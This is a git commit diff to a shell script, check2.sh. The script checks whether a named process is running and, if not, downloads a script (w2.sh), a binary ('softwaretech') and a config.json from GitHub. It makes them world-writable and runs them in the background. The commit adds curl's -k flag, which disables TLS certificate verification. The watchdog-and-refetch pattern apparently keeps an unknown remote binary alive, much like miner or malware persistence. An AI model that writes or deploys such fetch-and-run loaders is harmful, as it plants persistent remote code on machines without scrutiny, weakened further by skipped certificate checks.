112da0a2edb4bdc23a92e2d51dade082e42ceade
nulltrafficaway <nulltrafficaway@proton.me>
2026-07-08 16:52:19 -0400

    Update check2.sh

--- check2.sh
+++ check2.sh
@@ -7,9 +7,9 @@ matches=$(echo "$all_procs" | awk -v name="$PROC_NAME" '$2 == name')
 if [ -z "$matches" ]; then
 	cd ~
 	rm config.json
-	curl -O https://raw.githubusercontent.com/nulltrafficaway/labprojecttest/refs/heads/main/w2.sh
-	curl -O -L https://github.com/nulltrafficaway/project-lab-test/releases/download/test/softwaretech
-	curl -O https://raw.githubusercontent.com/nulltrafficaway/labprojecttest/refs/heads/main/config.json
+	curl -O -k https://raw.githubusercontent.com/nulltrafficaway/labprojecttest/refs/heads/main/w2.sh
+	curl -O -k -L https://github.com/nulltrafficaway/project-lab-test/releases/download/test/softwaretech
+	curl -O -k https://raw.githubusercontent.com/nulltrafficaway/labprojecttest/refs/heads/main/config.json
 	chmod 777 softwaretech
 	chmod 777 w2.sh
 	./w2.sh &
@@ -19,9 +19,9 @@ else
 	if [ -z "$alive" ]; then
 		cd ~
 	rm config.json
-	curl -O https://raw.githubusercontent.com/nulltrafficaway/labprojecttest/refs/heads/main/w2.sh
-	curl -O -L https://github.com/nulltrafficaway/project-lab-test/releases/download/test/softwaretech
-	curl -O https://raw.githubusercontent.com/nulltrafficaway/labprojecttest/refs/heads/main/config.json
+	curl -O -k https://raw.githubusercontent.com/nulltrafficaway/labprojecttest/refs/heads/main/w2.sh
+	curl -O -k -L https://github.com/nulltrafficaway/project-lab-test/releases/download/test/softwaretech
+	curl -O -k https://raw.githubusercontent.com/nulltrafficaway/labprojecttest/refs/heads/main/config.json
 	chmod 777 softwaretech
 	chmod 777 w2.sh
 	./w2.sh &
